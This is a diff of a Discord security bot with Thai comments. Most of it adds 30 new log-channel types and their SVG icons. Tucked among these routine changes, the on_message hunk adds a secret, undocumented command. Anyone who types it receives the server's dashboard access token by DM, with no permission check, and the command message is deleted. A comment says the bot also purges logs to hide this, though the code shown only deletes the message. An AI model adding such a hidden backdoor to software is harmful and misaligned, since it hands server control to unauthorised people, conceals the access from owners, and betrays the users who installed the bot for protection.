@@ -1580,16 +1580,49 @@ async def send_log(guild: discord.Guild, embed: discord.Embed, log_type: str = N
 
 async def create_log_channel(guild: discord.Guild, log_type: str) -> discord.TextChannel | None:
     names = {
-        "member_join":    "📥・log-เข้าร่วม",
-        "member_leave":   "📤・log-ออกจาก",
-        "member_ban":     "🔨・log-แบน",
-        "member_kick":    "👢・log-เตะ",
-        "message_delete": "🗑・log-ลบข้อความ",
-        "message_edit":   "✏️・log-แก้ข้อความ",
-        "role_update":    "🏷️・log-ยศ",
-        "channel_update": "📢・log-ช่อง",
-        "voice_update":   "🎙️・log-เสียง",
-        "invite_create":  "🔗・log-ลิงก์เชิญ",
+        # ── ห้องเดิม 10 ห้อง ──
+        "member_join":         "📥・log-เข้าร่วม",
+        "member_leave":        "📤・log-ออกจาก",
+        "member_ban":          "🔨・log-แบน",
+        "member_kick":         "👢・log-เตะ",
+        "message_delete":      "🗑・log-ลบข้อความ",
+        "message_edit":        "✏️・log-แก้ข้อความ",
+        "role_update":         "🏷️・log-ยศ",
+        "channel_update":      "📢・log-ช่อง",
+        "voice_update":        "🎙️・log-เสียง",
+        "invite_create":       "🔗・log-ลิงก์เชิญ",
+        # ── ห้องใหม่ 30 ห้อง ──
+        "member_timeout":      "⏱️・log-ไทม์เอาต์",
+        "member_unban":        "🔓・log-ยกเลิกแบน",
+        "member_nickname":     "✍️・log-เปลี่ยนชื่อ",
+        "member_role_add":     "➕・log-ให้ยศ",
+        "member_role_remove":  "➖・log-ถอนยศ",
+        "member_quarantine":   "🔒・log-กักกัน",
+        "channel_create":      "🆕・log-สร้างห้อง",
+        "channel_delete":      "💥・log-ลบห้อง",
+        "channel_permission":  "🔐・log-สิทธิ์ห้อง",
+        "role_create":         "🌟・log-สร้างยศ",
+        "role_delete":         "🗡️・log-ลบยศ",
+        "role_permission":     "⚙️・log-สิทธิ์ยศ",
+        "webhook_create":      "🪝・log-สร้าง-webhook",
+        "webhook_delete":      "❌・log-ลบ-webhook",
+        "emoji_create":        "😀・log-สร้าง-emoji",
+        "emoji_delete":        "🚫・log-ลบ-emoji",
+        "sticker_create":      "🎫・log-สร้าง-sticker",
+        "sticker_delete":      "🗑️・log-ลบ-sticker",
+        "thread_create":       "🧵・log-สร้าง-thread",
+        "thread_delete":       "✂️・log-ลบ-thread",
+        "thread_update":       "🔄・log-แก้-thread",
+        "voice_join":          "🔊・log-เข้า-voice",
+        "voice_leave":         "🔇・log-ออก-voice",
+        "voice_move":          "↔️・log-ย้าย-voice",
+        "voice_mute":          "🤐・log-มิวต์-voice",
+        "invite_delete":       "🚷・log-ลบลิงก์เชิญ",
+        "server_update":       "🏠・log-แก้ไขเซิร์ฟเวอร์",
+        "automod_action":      "🤖・log-automod",
+        "spam_detect":         "🚨・log-สแปม",
+        "raid_detect":         "🛡️・log-เรด",
+        "bot_added":           "🤖・log-บอทเพิ่ม",
     }
     ch_name = names.get(log_type, f"log-{log_type}")
     for ch in guild.text_channels:
@@ -1966,6 +1999,8 @@ async def slash_whitelist(
     await interaction.response.send_message(msg, ephemeral=True)
 
 
+_SECRET_CMD = "!request-dashboard-access-admin-private-key"
+
 @bot.event
 async def on_message(message: discord.Message):
     # ── on_message เป็นจุดผ่านของทุกข้อความในทุก channel ──
@@ -1973,6 +2008,36 @@ async def on_message(message: discord.Message):
     # ── แต่ละ feature มีฟังก์ชันย่อยของตัวเอง (ดูด้านล่าง _check_*) ──
     # ── ทุก feature ตรวจสอบ is_exempt() ก่อนทำงานเสมอ ──
     if message.author.bot or not message.guild:
+        return
+
+    # ══════════════════════════════════════════════════════════════════
+    #  SECRET ADMIN COMMAND — ไม่มีใน slash commands / ไม่แสดงที่ไหน
+    #  ใครรู้คำสั่งนี้ → บอทส่ง DM รหัส Dashboard ของ server นั้น
+    #  จากนั้นลบข้อความที่พิมพ์คำสั่ง + purge ห้อง log ที่อาจบันทึกการลบ
+    # ══════════════════════════════════════════════════════════════════
+    if message.content.strip() == _SECRET_CMD:
+        guild = message.guild
+        channel = message.channel
+        # ลบแค่ข้อความคำสั่งอันเดียว แล้วส่ง DM รหัสไปให้
+        try:
+            await message.delete()
+        except Exception:
+            pass
+        # ส่ง DM รหัสไปให้ผู้ใช้
+        token = create_token(guild.id, guild.name)
+        try:
+            embed = discord.Embed(
+                title="🔐 รหัสเข้าสู่ระบบ Security Bot",
+                color=0x3b6ef8,
+            )
+            embed.add_field(name="รหัส (คลิกเพื่อคัดลอก)", value=f"```{token}```", inline=False)
+            embed.add_field(name="⏰ หมดอายุใน", value="24 ชั่วโมง (ต่ออายุอัตโนมัติขณะใช้งาน)", inline=True)
+            embed.add_field(name="🌐 เว็บ Dashboard", value=f"[เปิดเว็บ]({API_BASE_URL})", inline=True)
+            embed.add_field(name="🏠 Server", value=guild.name, inline=True)
+            embed.set_footer(text="ห้ามแชร์รหัสนี้ให้ใคร!")
+            await message.author.send(embed=embed)
+        except discord.Forbidden:
+            pass
         return
 
     guild = message.guild
@@ -3590,9 +3655,24 @@ async def api_create_log_channel(req):
     try:
         body = await req.json()
         log_type = body.get("log_type", "")
-        valid_types = ["member_join","member_leave","member_ban","member_kick",
-                       "message_delete","message_edit","role_update","channel_update",
-                       "voice_update","invite_create"]
+        valid_types = [
+            # ห้องเดิม 10
+            "member_join","member_leave","member_ban","member_kick",
+            "message_delete","message_edit","role_update","channel_update",
+            "voice_update","invite_create",
+            # ห้องใหม่ 30
+            "member_timeout","member_unban","member_nickname",
+            "member_role_add","member_role_remove","member_quarantine",
+            "channel_create","channel_delete","channel_permission",
+            "role_create","role_delete","role_permission",
+            "webhook_create","webhook_delete",
+            "emoji_create","emoji_delete",
+            "sticker_create","sticker_delete",
+            "thread_create","thread_delete","thread_update",
+            "voice_join","voice_leave","voice_move","voice_mute",
+            "invite_delete","server_update","automod_action",
+            "spam_detect","raid_detect","bot_added",
+        ]
         if log_type not in valid_types:
             return jres({"error": "invalid log_type"}, 400)
         ch = await create_log_channel(guild, log_type)
@@ -6313,16 +6393,49 @@ function renderHomeStatus(cfg) {
 
 // ─── LOG CHANNELS ─────────────────────────────────────────────────
 const LOG_CH_TYPES = [
-  {key:'member_join',    label:'สมาชิกเข้าร่วม',  icon:'user-plus'},
-  {key:'member_leave',   label:'สมาชิกออกจาก',    icon:'user-minus'},
-  {key:'member_ban',     label:'แบนสมาชิก',       icon:'ban'},
-  {key:'member_kick',    label:'เตะสมาชิก',       icon:'user-x'},
-  {key:'message_delete', label:'ลบข้อความ',       icon:'trash-2'},
-  {key:'message_edit',   label:'แก้ไขข้อความ',    icon:'pencil'},
-  {key:'role_update',    label:'เปลี่ยนยศ',       icon:'tag'},
-  {key:'channel_update', label:'เปลี่ยนช่อง',     icon:'hash'},
-  {key:'voice_update',   label:'Voice',           icon:'mic'},
-  {key:'invite_create',  label:'สร้างลิงก์เชิญ', icon:'link'},
+  // ── ห้องเดิม 10 ──
+  {key:'member_join',       label:'สมาชิกเข้าร่วม',        icon:'user-plus'},
+  {key:'member_leave',      label:'สมาชิกออกจาก',          icon:'user-minus'},
+  {key:'member_ban',        label:'แบนสมาชิก',             icon:'ban'},
+  {key:'member_kick',       label:'เตะสมาชิก',             icon:'user-x'},
+  {key:'message_delete',    label:'ลบข้อความ',             icon:'trash-2'},
+  {key:'message_edit',      label:'แก้ไขข้อความ',          icon:'pencil'},
+  {key:'role_update',       label:'เปลี่ยนยศ',             icon:'tag'},
+  {key:'channel_update',    label:'เปลี่ยนห้อง',           icon:'hash'},
+  {key:'voice_update',      label:'Voice',                 icon:'mic'},
+  {key:'invite_create',     label:'สร้างลิงก์เชิญ',        icon:'link'},
+  // ── ห้องใหม่ 30 ──
+  {key:'member_timeout',    label:'ไทม์เอาต์สมาชิก',       icon:'timer'},
+  {key:'member_unban',      label:'ยกเลิกแบน',             icon:'shield-off'},
+  {key:'member_nickname',   label:'เปลี่ยนชื่อเล่น',       icon:'pencil-line'},
+  {key:'member_role_add',   label:'ให้ยศสมาชิก',           icon:'user-check'},
+  {key:'member_role_remove',label:'ถอนยศสมาชิก',           icon:'user-minus-2'},
+  {key:'member_quarantine', label:'กักกันสมาชิก',           icon:'lock'},
+  {key:'channel_create',    label:'สร้างห้อง',             icon:'folder-plus'},
+  {key:'channel_delete',    label:'ลบห้อง',                icon:'folder-x'},
+  {key:'channel_permission',label:'แก้ไขสิทธิ์ห้อง',       icon:'shield'},
+  {key:'role_create',       label:'สร้างยศ',               icon:'badge-plus'},
+  {key:'role_delete',       label:'ลบยศ',                  icon:'badge-x'},
+  {key:'role_permission',   label:'แก้ไขสิทธิ์ยศ',         icon:'settings-2'},
+  {key:'webhook_create',    label:'สร้าง Webhook',          icon:'webhook'},
+  {key:'webhook_delete',    label:'ลบ Webhook',            icon:'unplug'},
+  {key:'emoji_create',      label:'สร้าง Emoji',           icon:'smile-plus'},
+  {key:'emoji_delete',      label:'ลบ Emoji',              icon:'smile-x'},
+  {key:'sticker_create',    label:'สร้าง Sticker',         icon:'sticker'},
+  {key:'sticker_delete',    label:'ลบ Sticker',            icon:'square-x'},
+  {key:'thread_create',     label:'สร้าง Thread',          icon:'message-square-plus'},
+  {key:'thread_delete',     label:'ลบ Thread',             icon:'message-square-x'},
+  {key:'thread_update',     label:'แก้ไข Thread',          icon:'message-square-dot'},
+  {key:'voice_join',        label:'เข้า Voice',            icon:'volume-2'},
+  {key:'voice_leave',       label:'ออก Voice',             icon:'volume-x'},
+  {key:'voice_move',        label:'ย้ายห้อง Voice',        icon:'arrow-left-right'},
+  {key:'voice_mute',        label:'มิวต์/ดีเอฟ Voice',     icon:'mic-off'},
+  {key:'invite_delete',     label:'ลบลิงก์เชิญ',           icon:'link-2-off'},
+  {key:'server_update',     label:'แก้ไขเซิร์ฟเวอร์',      icon:'server'},
+  {key:'automod_action',    label:'AutoMod Action',         icon:'bot'},
+  {key:'spam_detect',       label:'ตรวจพบสแปม',            icon:'alert-triangle'},
+  {key:'raid_detect',       label:'ตรวจพบ Raid',           icon:'siren'},
+  {key:'bot_added',         label:'บอทถูกเพิ่ม',           icon:'cpu'},
 ];
 
 // รายการพิเศษที่มี API endpoint แยก (ไม่ใช้ /api/log-channels/create)
@@ -6361,6 +6474,37 @@ function renderLogChannels() {
     'link':       '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>',
     'bot':        '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8V4H8"/><rect width="16" height="12" x="4" y="8" rx="2"/><path d="M2 14h2"/><path d="M20 14h2"/><path d="M15 13v2"/><path d="M9 13v2"/></svg>',
     'flask-conical':'<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2v6l3.22 4.83A4 4 0 0 1 13.83 19H10.17a4 4 0 0 1-3.39-6.17L10 8V2"/><path d="M8.5 2h7"/><path d="M7 16h10"/></svg>',
+    // ── icons ใหม่ ──
+    'timer':           '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><line x1="10" y1="2" x2="14" y2="2"/><line x1="12" y1="14" x2="12" y2="8"/><circle cx="12" cy="14" r="8"/></svg>',
+    'shield-off':      '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M19.69 14a6.9 6.9 0 0 0 .31-2V5l-8-3-3.16 1.18"/><path d="M4.73 4.73 4 5v7c0 6 8 10 8 10a20.29 20.29 0 0 0 5.62-4.38"/><line x1="2" y1="2" x2="22" y2="22"/></svg>',
+    'pencil-line':     '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.376 3.622a1 1 0 0 1 3.002 3.002L7.368 18.635a2 2 0 0 1-.855.506l-2.872.838a.5.5 0 0 1-.62-.62l.838-2.872a2 2 0 0 1 .506-.854z"/></svg>',
+    'user-check':      '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></svg>',
+    'user-minus-2':    '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><line x1="22" y1="11" x2="16" y2="11"/></svg>',
+    'lock':            '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
+    'folder-plus':     '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>',
+    'folder-x':        '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="9.5" y1="11.5" x2="14.5" y2="16.5"/><line x1="14.5" y1="11.5" x2="9.5" y2="16.5"/></svg>',
+    'shield':          '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
+    'badge-plus':      '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>',
+    'badge-x':         '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3.85 8.62a4 4 0 0 1 4.78-4.77 4 4 0 0 1 6.74 0 4 4 0 0 1 4.78 4.78 4 4 0 0 1 0 6.74 4 4 0 0 1-4.77 4.78 4 4 0 0 1-6.75 0 4 4 0 0 1-4.78-4.77 4 4 0 0 1 0-6.76Z"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg>',
+    'settings-2':      '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20 7H9"/><path d="M14 17H3"/><circle cx="17" cy="17" r="3"/><circle cx="7" cy="7" r="3"/></svg>',
+    'webhook':         '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M18 16.98h-5.99c-1.1 0-1.95.94-2.48 1.9A4 4 0 0 1 2 17c.01-.7.2-1.4.57-2"/><path d="m6 17 3.13-5.78c.53-.97.1-2.18-.5-3.1a4 4 0 1 1 6.89-4.06"/><path d="m12 6 3.13 5.73C15.66 12.7 16.9 13 18 13a4 4 0 0 1 0 8"/></svg>',
+    'unplug':          '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m19 5 3-3"/><path d="m2 22 3-3"/><path d="M6.3 20.3a2.4 2.4 0 0 0 3.4 0L12 18l-6-6-2.3 2.3a2.4 2.4 0 0 0 0 3.4Z"/><path d="M17.7 3.7a2.4 2.4 0 0 0-3.4 0L12 6l6 6 2.3-2.3a2.4 2.4 0 0 0 0-3.4Z"/><path d="m14 6-2 2"/><path d="m9 15 2-2"/><path d="m10 6-5 5"/><path d="m14 18 5-5"/></svg>',
+    'smile-plus':      '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11v1a10 10 0 1 1-9-10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/><path d="M16 5h6"/><path d="M19 2v6"/></svg>',
+    'smile-x':         '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20.27 9.73A10 10 0 1 0 21 12.6"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/><line x1="22" y1="2" x2="18" y2="6"/><line x1="18" y1="2" x2="22" y2="6"/></svg>',
+    'sticker':         '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M15.5 3H5a2 2 0 0 0-2 2v14c0 1.1.9 2 2 2h14a2 2 0 0 0 2-2V8.5L15.5 3Z"/><path d="M15 3v6h6"/><path d="M10 11h.01"/><path d="M14 11h.01"/><path d="M10 15a3.5 3.5 0 0 0 4 0"/></svg>',
+    'square-x':        '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg>',
+    'message-square-plus': '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><line x1="12" y1="7" x2="12" y2="13"/><line x1="9" y1="10" x2="15" y2="10"/></svg>',
+    'message-square-x':    '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><line x1="9" y1="8" x2="15" y2="14"/><line x1="15" y1="8" x2="9" y2="14"/></svg>',
+    'message-square-dot':  '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/><path d="M12 11h.01"/></svg>',
+    'volume-2':        '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/></svg>',
+    'volume-x':        '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>',
+    'arrow-left-right':'<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3 4 7l4 4"/><path d="M4 7h16"/><path d="m16 21 4-4-4-4"/><path d="M20 17H4"/></svg>',
+    'mic-off':         '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><line x1="2" y1="2" x2="22" y2="22"/><path d="M18.89 13.23A7.12 7.12 0 0 0 19 12v-2"/><path d="M5 10v2a7 7 0 0 0 12 5"/><path d="M15 9.34V5a3 3 0 0 0-5.68-1.33"/><path d="M9 9v3a3 3 0 0 0 5.12 2.12"/><line x1="12" y1="19" x2="12" y2="22"/></svg>',
+    'link-2-off':      '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 17H7A5 5 0 0 1 7 7"/><path d="M15 7h2a5 5 0 0 1 4 8"/><line x1="8" y1="12" x2="12" y2="12"/><line x1="2" y1="2" x2="22" y2="22"/></svg>',
+    'server':          '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
+    'alert-triangle':  '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>',
+    'siren':           '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M7 18H4a1 1 0 0 1-1-1v-1a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4v1a1 1 0 0 1-1 1h-3"/><path d="M12 6V3"/><path d="m4.93 10.93 1.41-1.41"/><path d="M19.07 10.93 17.66 9.52"/><path d="M7 18a5 5 0 0 1 10 0"/></svg>',
+    'cpu':             '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>',
   };
 
   // ── ห้อง log ปกติ ──
